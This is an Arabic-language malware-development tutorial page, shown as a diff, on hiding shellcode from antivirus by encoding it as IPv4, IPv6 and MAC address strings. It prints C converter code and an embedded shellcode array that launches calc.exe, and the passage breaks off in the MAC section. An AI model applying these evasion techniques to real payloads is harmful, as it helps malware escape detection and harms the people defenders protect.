@@ -1,0 +1,1815 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payload Obfuscation</title>
+    <link rel="icon" href="../src/Pics/PayObfs.jpg" type="image/png">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet"
+        crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+    <style>
+        html,
+        body {
+            font-family: 'Cairo', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: black;
+            overflow-x: hidden;
+        }
+
+        nav {
+            width: 100%;
+            height: 10vh;
+            position: sticky;
+        }
+
+        .nav-container {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 2rem;
+            font-weight: bold;
+            cursor: pointer;
+            background: -webkit-linear-gradient(#16ff00, #ffed00);
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .logo span {
+            cursor: pointer;
+            background: -webkit-linear-gradient(#16ff00, #ffed00);
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .hamburg,
+        .cancel {
+            cursor: pointer;
+            position: absolute;
+            right: 15px;
+            top: 10px;
+            color: #16ff00;
+            display: none;
+            font-size: clamp(2.5rem, 0.5rem + 5vw, 3rem);
+        }
+
+        .nav-container .links {
+            display: flex;
+        }
+
+        .nav-container .links a {
+            font-size: 1.2rem;
+            color: white;
+            margin: 0 20px;
+            text-decoration: none;
+            font-weight: 550;
+            transition: 0.3s linear;
+        }
+
+        .nav-container .links a:hover {
+            color: #16ff00;
+            border-bottom: 2px solid #16ff00;
+        }
+
+        .dropdown {
+            max-height: 100vh;
+            overflow-y: auto;
+            z-index: 100;
+            position: absolute;
+            top: 0;
+            transform: translateY(-500px);
+            width: 100%;
+            height: auto;
+            backdrop-filter: blur(4px) brightness(40%);
+            box-shadow: 0 0 20px black;
+            transition: 0.2s linear;
+        }
+
+        .dropdown .links a {
+            display: flex;
+            color: white;
+            text-decoration: none;
+            padding: 15px 0;
+            justify-content: center;
+            align-items: center;
+            transition: 0.2s linear;
+        }
+
+        .dropdown .links a:hover {
+            background-color: #16ff00;
+            color: black;
+        }
+
+        .dark-mode {
+            background-color: #222;
+            color: #f4f4f4;
+        }
+
+        header {
+            background: -webkit-linear-gradient(#16ff00, #ffed00);
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-align: center;
+            border-bottom: 1px solid #16ff00;
+        }
+
+
+
+        header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 0 15px;
+        }
+
+
+        .article {
+            background: white;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            overflow-x: hidden;
+        }
+
+        .article h2 {
+            margin-top: 0;
+            border-top: 2px solid #16ff00;
+            border-bottom: 2px solid #16ff00;
+            padding-bottom: 5px;
+        }
+
+        .code-block {
+            background: #16ff00;
+            padding: 10px;
+            border-radius: 5px;
+            overflow-x: auto;
+            direction: ltr;
+            text-align: left;
+            font-size: 15px;
+        }
+
+
+        @media (max-width:884px) {
+            nav .logo {
+                position: absolute;
+                top: 16px;
+                left: 15px;
+                font-size: 1.5rem;
+            }
+
+            .nav-container .links {
+                display: none;
+            }
+
+            .hamburg,
+            .cancel {
+                display: block;
+            }
+
+        }
+
+
+        @media (max-width:440px) {
+            .nav-container {
+                margin-top: 10px;
+            }
+
+            table {
+                display: block;
+                overflow-x: auto;
+            }
+        }
+
+        .footer {
+            background: #111;
+            color: #fff;
+            text-align: center;
+            padding: 5px;
+            position: relative;
+            bottom: 0;
+            width: 100%;
+            margin-top: auto;
+        }
+
+        .footer a {
+            color: #16ff00;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .footer a:hover {
+            color: #35a849;
+        }
+
+        .ltr {
+            direction: ltr;
+            text-align: left;
+        }
+
+        .article-image {
+            width: 100%;
+            height: auto;
+            border-radius: 8px;
+        }
+
+        .nav-buttons a {
+            background: #16ff00;
+            color: black;
+            padding: 10px 0;
+            border-radius: 5px;
+            text-decoration: none;
+            transition: background-color 0.3s;
+            text-align: center;
+            flex: 1;
+            margin: 0 10px;
+            max-width: 150px;
+            font-size: 20px;
+        }
+
+        .nav-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+        }
+
+        .nav-buttons a:hover {
+            background: #35a849;
+        }
+
+        .download-link {
+            text-decoration: none;
+            color: #14aa2d;
+            font-weight: bold;
+            transition: color 0.3s ease;
+        }
+
+        .download-link:hover {
+            color: #16ff00;
+            text-decoration: underline;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 10px auto;
+            text-align: center;
+
+
+        }
+
+        th,
+        td {
+            border: 1px solid black;
+            padding: 7px;
+        }
+
+        th {
+            background-color: #16ff00;
+        }
+
+        video {
+            width: 100%;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+        }
+    </style>
+</head>
+
+<body>
+    <section>
+        <nav>
+            <div class="nav-container" style="direction: ltr;">
+                <div class="logo" data-aos="zoom-in" data-aos-duration="800">
+                    <span>0x4de1</span>
+                </div>
+                <div class="links">
+                    <div class="link" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100"><a
+                            href="https://0x4de1.github.io">Home</a></div>
+                    <div class="link" data-aos="fade-up" data-aos-duration="800" data-aos-delay="300"><a
+                            href="../MalDev.html">Mal Dev</a></div>
+                    <div class="link" data-aos="fade-up" data-aos-duration="800" data-aos-delay="400"><a
+                            href="https://0x4de1.medium.com/" id="blogLink">CTF Writeups</a></div>
+                </div>
+            </div>
+            <i class="fa-solid fa-bars hamburg" onclick="hamburg()"></i>
+            <div class="dropdown">
+                <div class="links">
+                    <a href="https://0x4de1.github.io">Home</a>
+                    <a href="../MalDev.html">Mal Dev</a>
+                    <a href="https://0x4de1.medium.com">CTF Writeups</a>
+                    <i class="fa-solid fa-xmark cancel" onclick="cancel()"></i>
+                </div>
+            </div>
+        </nav>
+        <header>
+            <h1 id="article-title" style="direction: ltr;">Payload Obfuscation</h1>
+        </header>
+        <div class="container">
+            <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                <img src="../src/Pics/PayObfs.jpg" alt="HomeLab" class="article-image" loading="lazy">
+            </div>
+            <div class="article" data-aos="zoom-in" data-aos-duration="800">
+                <p style="text-align: center; font-weight: bold;">السَّلاَمُ عَلَيْكُمْ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ
+                </p>
+                <p style="text-align: center; font-weight: bold;">اللَّهُمَّ صَلِّ عَلَى مُحَمَّدٍ وَعَلَى آلِ
+                    مُحَمَّدٍ، كَمَا صَلَّيْتَ عَلَى إِبْرَاهِيمَ وَآلِ
+                    إِبْرَاهِيمَ، إِنَّكَ حَمِيدٌ مَجِيدٌ، وَبَارِكْ عَلَى مُحَمَّدٍ وَعَلَى آلِ مُحَمَّدٍ، كَمَا
+                    بَارَكْتَ عَلَى إِبْرَاهِيمَ وَآلِ إِبْرَاهِيمَ، إِنَّكَ حَمِيدٌ مَجِيدٌ،
+                </p>
+            </div>
+            <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                <h2>Introduction</h2>
+                <p>[+] إتكلمنا فـ المقالة اللـ فاتت عن الـ Payload Encryption ، وجربنا نـ Bypass الـ Windows Defender
+                    وكمان Kaspersky .. والنتيجة كانت إن:</p>
+                <ul style="font-weight: bold;">
+                    <li>الـ XOR نجح ضد Windows Defender ، بس اتكشف بسهولة مع الـ Kaspersky.</li>
+                    <li>أما الـ RC4 والـ AES ، فعدوا من الاتنين بدون مشاكل.</li>
+                </ul>
+                <p>[+] النهاردة بقي هنتكلم عن طريقة تانية نـ Bypass الـ Static Analysis ، وهي الـ Obfuscation.</p>
+                <p>[+] وهنتكلم عن:</p>
+                <ol style="direction: ltr;">
+                    <li style="font-weight: bold;">Obfuscation :</li>
+                    <p>1.1 Shellcode to IPv4<br>
+                        1.2 Shellcode to IPv6<br>
+                        1.3 Shellcode to MAC Address<br>
+                        1.4 shellcode to UUIDs<br>
+                        1.5 ShellCode to Words
+                    </p>
+                    <li style="font-weight: bold;">Deobfuscation :</li>
+                    <p>2.1 IPv4 to Shellcode<br>
+                        2.2 IPv6 to shellcode<br>
+                        2.3 MAC Address to shellcode<br>
+                        2.4 UUID to shellcode<br>
+                        2.5 Words to shellcode
+                    </p>
+                    <li style="font-weight: bold;">Tools :</li>
+                    <p>3.1 HellShell<br>
+                        3.2 MiniShell
+                    </p>
+                </ol>
+                <h2 style="direction: ltr;">1. Obfuscation :</h2>
+                <p>[+] لما استخدمنا الـ Encryption .. اللـ كان بيحصل إن الشيل كود بيتشفر .. يعني بيتحول لحاجة مش مفهومة
+                    .. هنا بيكون فـ مشكلة : </p>
+                <ul>
+                    <li>وهي إن ممكن أي AV / EDR يشك فـ إيه الكلام اللـ مش مفهوم ده ، دا غير إن لما بيحصل عمليات التفشير
+                        والفك
+                        وقت الـ Runtime .. دا بيخلي الـ Behavior للملف مشبوه.</li>
+                    <li>فـ عشان كده هنستخدم الـ <code style="background: #16ff00; font-size: 14px;">Obfuscation</code>
+                        .. والفكرة هنا إننا بنحول الشيل كود من كونه داتا خبيثة لـ
+                        داتا معلومة .. يعني نخلي شكلها عادي عشان ميتشكش فيها.</li>
+                    <li>زي إننا نحول الشيل كود ده لـ <code
+                            style="background: #16ff00; font-size: 14px;">مجموعة IPs</code> .. هنا الـ AV / EDR هيفتكروا
+                        إن دي
+                        حاجه تبع البرنامج وداتا عادية
+                        ، وهو مش ذكي لدرجة إنه يفكر إنها شيل كود ويحاول يرجعها لأصلها.</li>
+                </ul>
+                <p style="font-weight: bold;">[+] يلا نبدأ نتكلم عن إزاي نعمل ده :</p>
+                <p style="border-top: 2px solid #16ff00;"></p>
+                <h3 style="direction: ltr;">1.1 Shellcode to IPv4</h3>
+                <p>[+] الفكرة هنا إننا بنحول كل البايتس فـ الشيل كود لـ أرقام .. ونعدي ع كل 4 أرقام مع بعض نضيف بينهم
+                    دوت ، عشان يكون ع شكل الـ IP المعروف .. تعالي نبدأ الخطوات ونشوف هنعمل إيه :</p>
+                <ol>
+                    <li>أول جزء ودي العملية اللـ هتاخد كل 4 بايتس وتحولها لـ أرقام عشان يكون بشكل الـ IP .. ودي بتاخد 4
+                        متغيرات ، وبتستخدم <code style="background: #16ff00; font-size: 14px;">malloc(16)</code> عشان
+                        تحجز مكان فـ الميموري تقدر تخزن فيه العنوان كـ string (أقصي طول لـ IPv4 هو 15 + الـ null
+                        terminator). .. وبتستخدم <code style="background: #16ff00; font-size: 14px;">sprintf</code> عشان
+                        تنسق الأرقام بالشكل [a.b.c.d].</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Obfs-IPv4-1.png" alt="ShellcodeToIPV4-1" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li>لو جربت تشغل الكود من غير السطر ده ، الـ Visual Studio هيقولك إن استخدام الدالة <code
+                            style="background: #16ff00; font-size: 14px;">sprintf</code> مش أمان
+                        .. ودا لإنها مبتعملش فحص لحجم الداتا ، يعني لو كانت الداتا اللـ داخله أكبر من المساحة المحجوزة ،
+                        ممكن يحصل <code style="background: #16ff00; font-size: 14px;">Buffer Overflow</code> ..
+                        وMicrosoft بتنصح باستخدام <code style="background: #16ff00; font-size: 14px;">sprintf_s</code>
+                        .. بس حاليا الموضوع ده مش
+                        هنركز
+                        عليه فـ هنوقف التحذير بالسطر ده.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Obfs-IPv4-2.png" alt="ShellcodeToIPV4-2" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li>تاني جزء العملية <code
+                            style="background: #16ff00; font-size: 14px;">ShellcodeToIPv4Output</code> ودي اللـ بتحول
+                        الشيل كود لـ عناوين IPv4 وتطبعها فـ شكل
+                        مصفوفة نصية .. وفـ الأول بتتأكد إن الشيل كود والحجم مش صفر ولا Null .. وبعدها بتبدأ تطبع تعريف
+                        المصفوفة اللـ بيكون فيها الـ Ips .. بعد كده ، بتعدي ع كل 4 بايت للدالة <code
+                            style="background: #16ff00; font-size: 14px;">ShellcodeToIPv4</code> واللـ
+                        بتكون عنوان IP بالنمط <code style="background: #16ff00; font-size: 14px;">"X.X.X.X"</code> ..
+                        ولما بتخلص طباعة بتفضي المنطقة اللـ كانت محجوزة.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Obfs-IPv4-3.png" alt="ShellcodeToIPV4-3" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li>آخر جزء بنضيف الشيل كود ، والـ Main Function وهنا بتبدأ تستدعي الدالة <code
+                            style="background: #16ff00; font-size: 14px;">ShellcodeToIPv4Output</code>
+                        وبتديلها الشيل كود عشان تبدأ عملية التحويل.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Obfs-IPv4-4.png" alt="ShellcodeToIPV4-4" class="article-image"
+                            loading="lazy">
+                    </div>
+                </ol>
+                <p style="font-weight: bold;">[+] يلا نـ رن :</p>
+                <ul>
+                    <li>هتلاقي إن الشيل كود اتحول لـ IPs والدنيا تمام.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Obfs-IPv4-5.png" alt="ShellcodeToIPV4-5" class="article-image"
+                            loading="lazy">
+                    </div>
+                </ul>
+                <p style="font-weight: bold;">[+] الكود النهائي :</p>
+                <div class="code-block">
+                    <code>
+                        #include &lt;Windows.h><br>
+                            #include &lt;stdio.h><br><br>
+                            
+                            #pragma warning (disable:4996)<br><br>
+                            
+                            char* ShellcodeToIPv4(int a, int b, int c, int d) {<br>
+                                &nbsp;&nbsp;char* Output = (char*)malloc(16); <br>
+                                &nbsp;&nbsp;if (Output == NULL) {<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;return NULL;<br>
+                                    &nbsp;&nbsp;}<br>
+                                    &nbsp;&nbsp;sprintf(Output, "%d.%d.%d.%d", a, b, c, d);<br>
+                                    &nbsp;&nbsp;return Output;<br>
+                            }<br><br>
+                            
+                            BOOL ShellcodeToIPv4Output(unsigned char* pShellcode, SIZE_T ShellcodeSize) {<br><br>
+                            
+                                &nbsp;&nbsp;if (pShellcode == NULL || ShellcodeSize == 0 ) {<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                                    &nbsp;&nbsp;}<br><br>
+                            
+                                    &nbsp;&nbsp;printf("char* Ipv4Array[%d] = {\n\t", (int)(ShellcodeSize / 4));<br><br>
+                            
+                                    &nbsp;&nbsp;int counter = 0;<br><br>
+                            
+                                    &nbsp;&nbsp;for (int i = 0; i < ShellcodeSize; i += 4) {<br>
+                                        &nbsp;&nbsp;&nbsp;&nbsp;counter++;<br><br>
+                            
+                                        &nbsp;&nbsp;&nbsp;&nbsp;char* IP = ShellcodeToIPv4(pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3]);<br><br>
+                            
+                                        &nbsp;&nbsp;&nbsp;&nbsp;if (IP == NULL) {<br>
+                                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                                            &nbsp;&nbsp;&nbsp;&nbsp;}<br><br>
+                            
+                                            &nbsp;&nbsp;&nbsp;&nbsp;if (i == ShellcodeSize - 4) {<br>
+                                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("\"%s\"", IP);<br>
+                                                &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                                                &nbsp;&nbsp;&nbsp;&nbsp;else {<br>
+                                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("\"%s\", ", IP);<br>
+                                                    &nbsp;&nbsp;&nbsp;&nbsp;}<br><br>
+                            
+                                                    &nbsp;&nbsp;&nbsp;&nbsp;free(IP);  <br><br>
+                            
+                                                    &nbsp;&nbsp;&nbsp;&nbsp;if (counter % 4 == 0) {<br>
+                                                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("\n\t");<br>
+                                                        &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                                                        &nbsp;&nbsp;}<br><br>
+                            
+                                                        &nbsp;&nbsp;printf("\n};\n\n");<br><br>
+                            
+                                                        &nbsp;&nbsp;return TRUE;<br>
+                            }<br><br>
+                            
+                            unsigned char shellcode[] =<br>
+                            "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"<br>
+                            "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"<br>
+                            "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"<br>
+                            "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"<br>
+                            "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"<br>
+                            "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"<br>
+                            "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"<br>
+                            "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"<br>
+                            "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"<br>
+                            "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"<br>
+                            "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"<br>
+                            "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"<br>
+                            "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"<br>
+                            "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"<br>
+                            "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"<br>
+                            "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"<br>
+                            "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"<br>
+                            "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"<br>
+                            "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"<br>
+                            "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";<br><br>
+                            
+                            
+                            int main() {<br><br>
+                            
+                                &nbsp;&nbsp;printf("[i] Press &lt;Enter> to Convert ShellCode to Ipv4...\n\n");<br>
+                                &nbsp;&nbsp;getchar();<br><br>
+                            
+                                &nbsp;&nbsp;if (!ShellcodeToIPv4Output(shellcode, sizeof(shellcode) - 1)) {<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br>
+                                    &nbsp;&nbsp;}<br><br>
+                            
+                                    &nbsp;&nbsp;printf("[i] Press &lt;Enter> to Quit...\n");<br>
+                                    &nbsp;&nbsp;getchar();<br><br>
+                            
+                                    &nbsp;&nbsp;return 0;<br>
+                            }<br>
+                    </code>
+                </div>
+                <p style="border-top: 2px solid #16ff00;"></p>
+                <h3 style="direction: ltr;">1.2 Shellcode to IPv6</h3>
+                <p>[+] فـ الجزء ده ، هنعدل شوية حاجات كدا .. تعالي نشوف :</p>
+                <ol>
+                    <li>هنزود عدد المتغيرات فـ الدالة بما يتناسب مع حجم الـ IPv6 :</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Obfs-IPv6-1.png" alt="ShellcodeToIPV6-1" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li>وهنا دي العملية اللـ هتحول الشيل كود لـ IPv6 .. بنفس فكرة الـ IPv4 :</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Obfs-IPv6-2.png" alt="ShellcodeToIPV6-2" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li>ودا كدا الشيل كود والـ Main Function.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Obfs-IPv6-3.png" alt="ShellcodeToIPV6-3" class="article-image"
+                            loading="lazy">
+                    </div>
+                </ol>
+                <p style="font-weight: bold;">[+] يلا نـ رن :</p>
+                <ul style="font-weight: bold;">
+                    <li>تمام ✅</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Obfs-IPv6-4.png" alt="ShellcodeToIPV6-4" class="article-image"
+                            loading="lazy">
+                    </div>
+                </ul>
+                <p style="font-weight: bold;">[+] الكود النهائي :</p>
+                <div class="code-block">
+                    <code>
+                        #include &lt;Windows.h><br>
+                            #include &lt;stdio.h><br><br>
+                            
+                            #pragma warning (disable:4996)<br><br>
+                            char* ShellcodeToIPv6(int a, int b, int c, int d, int e, int f, int g, int h,
+    int i, int j, int k, int l, int m, int n, int o, int p) {<br>
+        &nbsp;&nbsp;char* Output = (char*)malloc(40); <br>
+        &nbsp;&nbsp;if (Output == NULL) {<br>
+            &nbsp;&nbsp;&nbsp;&nbsp;return NULL;<br>
+            &nbsp;&nbsp;}<br>
+            &nbsp;&nbsp;sprintf(Output, "%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x",
+        a, b, c, d, e, f, g, h, i, j, k, l, m, n, o, p);<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;return Output;<br>
+}<br><br>
+
+BOOL ShellcodeToIPv6Output(unsigned char* pShellcode, SIZE_T ShellcodeSize) {<br>
+    &nbsp;&nbsp;if (pShellcode == NULL || ShellcodeSize == 0) {<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+        &nbsp;&nbsp;}<br><br>
+
+        &nbsp;&nbsp;printf("char* Ipv6Array[%d] = {\n\t", (int)(ShellcodeSize / 16));<br><br>
+
+        &nbsp;&nbsp;int counter = 0;<br><br>
+
+        &nbsp;&nbsp;for (int i = 0; i < ShellcodeSize; i += 16) {<br>
+            &nbsp;&nbsp;&nbsp;&nbsp;counter++;<br><br>
+
+            &nbsp;&nbsp;&nbsp;&nbsp;char* IP = ShellcodeToIPv6(<br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3],<br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pShellcode[i + 4], pShellcode[i + 5], pShellcode[i + 6], pShellcode[i + 7],<br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pShellcode[i + 8], pShellcode[i + 9], pShellcode[i + 10], pShellcode[i + 11],<br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pShellcode[i + 12], pShellcode[i + 13], pShellcode[i + 14], pShellcode[i + 15]<br>
+            &nbsp;&nbsp;);<br><br>
+
+            &nbsp;&nbsp;&nbsp;&nbsp;if (IP == NULL) {<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;}<br><br>
+
+                &nbsp;&nbsp;&nbsp;&nbsp;if (i + 16 >= ShellcodeSize) {<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("\"%s\"", IP);<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;else {<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("\"%s\", ", IP);<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;}<br><br>
+
+                        &nbsp;&nbsp;&nbsp;&nbsp;free(IP);<br><br>
+
+                        &nbsp;&nbsp;&nbsp;&nbsp;if (counter % 2 == 0) {  <br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("\n\t");<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                            &nbsp;&nbsp;}
+    <br><br>
+    &nbsp;&nbsp;printf("\n};\n\n");<br><br>
+
+    &nbsp;&nbsp;return TRUE;<br>
+}<br><br>
+
+unsigned char shellcode[] =<br>
+                            "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"<br>
+                            "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"<br>
+                            "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"<br>
+                            "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"<br>
+                            "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"<br>
+                            "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"<br>
+                            "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"<br>
+                            "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"<br>
+                            "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"<br>
+                            "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"<br>
+                            "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"<br>
+                            "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"<br>
+                            "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"<br>
+                            "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"<br>
+                            "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"<br>
+                            "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"<br>
+                            "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"<br>
+                            "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"<br>
+                            "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"<br>
+                            "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";<br><br>
+
+int main() {<br>
+    &nbsp;&nbsp;printf("[i] Press &lt;Enter> to Convert ShellCode to Ipv6...\n\n");<br>
+    &nbsp;&nbsp;getchar();<br><br>
+
+    &nbsp;&nbsp;if (!ShellcodeToIPv6Output(shellcode, sizeof(shellcode) - 1)) {<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br>
+        &nbsp;&nbsp;}
+    <br><br>
+    &nbsp;&nbsp;printf("[i] Press &lt;Enter> to Quit...\n");<br>
+    &nbsp;&nbsp;getchar();<br><br>
+
+    &nbsp;&nbsp;return 0;<br>
+}<br>
+                    </code>
+                </div>
+                <p style="border-top: 2px solid #16ff00;"></p>
+                <h3 style="direction: ltr;">1.3 Shellcode to MAC Address :</h3>
+                <p>[+] بعد مـ شفنا إزاي نحول الشيل كود لـ IPv4 وIPv6 عشان نعمل تمويه من برامج الـ AV / EDR ، دلوقتي
+                    هنشوف تكنيك تاني ، وهو تحويله لـ MAC Addresses.</p>
+                <p>[+] الفكرة هنا إن أي جهاز ع الشبكة بيكون ليه MAC Address مميز ، وهو عبارة عن 6 بايتس مكتوبة بالـ
+                    Hexadecimal ومفصولة بالعلامة (-) ، تعالي نشوف الكود :</p>
+                <ol>
+                    <li>بما إن كل MAC Address بيتكون من 6 بايتس ، بنحدد ده عشان نقسم الشيل كود عليه.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Obfs-MAC-1.png" alt="ShellcodeToMAC-1" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li>الدالة اللـ بتحول الشيل كود لـ MAC Addresses ، وبتتأكد إن الشيل كود وحجمة ميكونوش NULL ولا
+                        قيمتهم 0.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Obfs-MAC-2.png" alt="ShellcodeToMAC-2" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li>هنا اللوب بتمشي ع كل 6 بايتس مع بعض ، وبتحولهم لـ MAC Address بالشكل ده "XX-XX-XX-XX-XX-XX" ، و
+                        كل بايت بيتحول لقيمته بالـ Hexadecimal بترميز %02X (يعني دايما رقمين حتى لو كان أقل من 16).</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Obfs-MAC-3.png" alt="ShellcodeToMAC-3" class="article-image"
